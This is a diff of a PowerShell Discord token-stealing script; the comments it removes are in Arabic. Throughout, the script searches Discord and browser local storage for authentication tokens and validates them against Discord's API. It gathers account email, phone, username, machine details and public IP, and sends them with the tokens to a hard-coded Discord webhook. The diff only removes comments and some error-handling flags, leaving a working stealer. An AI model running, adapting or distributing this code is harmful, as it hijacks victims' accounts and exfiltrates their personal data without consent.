@@ -1,9 +1,8 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-# 🔧 ضع رابط الـ Webhook هنا
+# Webhook الخاص بك
 $webhook_url = "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7"
 
-# 🔍 أماكن البحث عن التوكنات
 $locations = @(
     "$env:APPDATA\Discord\Local Storage\leveldb",
     "$env:APPDATA\discordcanary\Local Storage\leveldb",
@@ -14,13 +13,12 @@ $locations = @(
     "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb"
 )
 
-# 🔁 تجميع التوكنات
 $tokens = @()
 
 foreach ($path in $locations) {
     if (Test-Path $path) {
-        Get-ChildItem -Path $path -Filter "*.ldb" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
-            $content = Get-Content -Path $_.FullName -Raw -ErrorAction SilentlyContinue
+        Get-ChildItem -Path $path -Filter "*.ldb" -Recurse | ForEach-Object {
+            $content = Get-Content -Path $_.FullName -Raw
             $matches = Select-String -InputObject $content -Pattern '([\w-]{24}\.[\w-]{6}\.[\w-]{27})' -AllMatches
             foreach ($match in $matches.Matches) {
                 if ($tokens -notcontains $match.Value) {
@@ -31,7 +29,6 @@ foreach ($path in $locations) {
     }
 }
 
-# 🔐 فحص صلاحية التوكنات وإرسالها
 foreach ($token in $tokens) {
     $headers = @{
         'Authorization' = $token
@@ -39,9 +36,8 @@ foreach ($token in $tokens) {
     }
 
     try {
-        $response = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Headers $headers -Method Get -ErrorAction Stop
+        $response = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Headers $headers -Method Get
 
-        # ✅ معلومات الحساب
         $username = "$($response.username)#$($response.discriminator)"
         $email = $response.email
         $phone = $response.phone
@@ -49,32 +45,30 @@ foreach ($token in $tokens) {
         $avatar = $response.avatar
         $avatar_url = "https://cdn.discordapp.com/avatars/$id/$avatar.png"
 
-        # 🖥 معلومات الجهاز
         $pc_username = $env:UserName
         $pc_os = (Get-CimInstance Win32_OperatingSystem).Caption
         $pc_cpu = (Get-CimInstance Win32_Processor).Name
         $ip = Invoke-RestMethod -Uri "https://ipinfo.io/ip"
 
-        # 🧾 بناء الرسالة
         $embed = @{
-            title = "🎯 New Token Found!"
+            title = "New Token Found"
             color = 16753920
             thumbnail = @{
                 url = $avatar_url
             }
             fields = @(
                 @{
-                    name = "👤 Account Info"
+                    name = "Account Info"
                     value = "Username: $username`nEmail: $email`nPhone: $phone"
                     inline = $false
                 },
                 @{
-                    name = "💻 PC Info"
+                    name = "PC Info"
                     value = "User: $pc_username`nOS: $pc_os`nCPU: $pc_cpu`nIP: $ip"
                     inline = $false
                 },
                 @{
-                    name = "🔑 Token"
+                    name = "Token"
                     value = "``$token``"
                     inline = $false
                 }
@@ -87,10 +81,8 @@ foreach ($token in $tokens) {
             embeds = @($embed)
         } | ConvertTo-Json -Depth 5
 
-        Invoke-RestMethod -Uri $webhook_url -Method Post -Body $payload -ContentType 'application/json' -UseBasicParsing
+        Invoke-RestMethod -Uri $webhook_url -Method Post -Body $payload -ContentType 'application/json'
     } catch {
-        # إذا التوكن غير صالح أو فشل الاتصال
         continue
     }
 }
-
